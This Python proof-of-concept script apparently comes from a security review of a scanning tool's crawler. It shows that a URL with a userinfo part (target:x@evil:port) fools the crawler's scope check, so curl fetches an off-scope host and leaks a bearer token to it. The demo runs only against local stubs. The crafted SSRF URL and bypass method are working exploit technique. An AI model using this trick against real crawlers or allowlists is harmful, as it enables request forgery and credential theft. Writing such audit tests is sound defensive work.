"""PoC-04: SSRF via URL userinfo in the deep crawler scope check.

Root cause (crawler.py:198, 422):
    netloc = urlparse(url).netloc.lower().split(":")[0]
    if netloc != tgt and not netloc.endswith("." + tgt): ...

urlparse("http://TARGET:pass@EVIL:PORT/path").netloc = "TARGET:pass@EVIL:PORT"
.split(":")[0]  →  "TARGET"   ← scope check sees the *username*, not the host

curl actually connects to EVIL:PORT, auth headers included.
Both _add_raw() (storage gate) and the deep-crawl queue gate (line 422) share
the same broken check, so the off-scope URL is stored AND queued for fetching.

Local demo: two stubs on 127.0.0.1 (different ports).  No real network traffic.
"""
import sys
import urllib.parse as _up
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from _common import Recorder, report  # noqa: E402
from scanner import utils             # noqa: E402
from scanner.crawler import Crawler   # noqa: E402

BEARER = "VICTIM-BEARER-7c9a"


def main() -> int:
    # stub_target  = the legitimate scan target (port P1)
    # stub_evil    = the off-scope server that should NEVER be fetched (port P2)
    stub_target = Recorder(body=b'<a href="/">target home</a>')
    stub_evil   = Recorder(body=b"evil-response")
    P1 = stub_target.port
    P2 = stub_evil.port

    # Craft the SSRF URL: userinfo = "127.0.0.1" (= target host), real host = 127.0.0.1:P2
    # urlparse("http://127.0.0.1:x@127.0.0.1:P2/ssrf").netloc.split(":")[0] == "127.0.0.1"
    # so the scope check passes, but curl connects to port P2 (evil).
    ssrf_url = f"http://127.0.0.1:x@127.0.0.1:{P2}/ssrf-hit"

    # ── 1. scope check bypass ────────────────────────────────────────────────
    crawler = Crawler(target="127.0.0.1", live_hosts=[stub_target.url],
                      config={}, findings=[])
    crawler._add_raw(ssrf_url, "test")
    scope_bypassed = ssrf_url in crawler.raw_urls

    # ── 2. confirm curl routes to the off-scope stub (P2), not P1 ───────────
    utils.set_auth(bearer=BEARER)
    try:
        utils.run(["curl", "-sk", "--max-time", "5", ssrf_url], timeout=8)
    finally:
        utils.set_auth()

    stub_target.close()
    evil_got_hit   = bool(stub_evil.last)
    target_was_hit = bool(stub_target.last)
    evil_got_auth  = BEARER in stub_evil.last.get("headers", {}).get("authorization", "")
    stub_evil.close()

    # ── 3. deep-crawl gate also bypassed ─────────────────────────────────────
    parsed_netloc = _up.urlparse(ssrf_url).netloc.lower().split(":")[0]
    gate_also_bypassed = (parsed_netloc == "127.0.0.1")

    confirmed = scope_bypassed and evil_got_hit and (not target_was_hit) and evil_got_auth
    detail = (
        f"scope_check_bypassed={scope_bypassed} | "
        f"evil_stub_hit={evil_got_hit} | "
        f"target_stub_hit={target_was_hit} | "
        f"evil_got_auth={evil_got_auth} | "
        f"deep_crawl_gate_also_bypassed={gate_also_bypassed} | "
        f"userinfo_field_seen_as_host={parsed_netloc!r}"
    )
    return report(
        "PoC-04",
        "SSRF via URL userinfo in crawler scope check (off-scope host fetched + auth leaked)",
        confirmed, detail,
    )


if __name__ == "__main__":
    raise SystemExit(main())
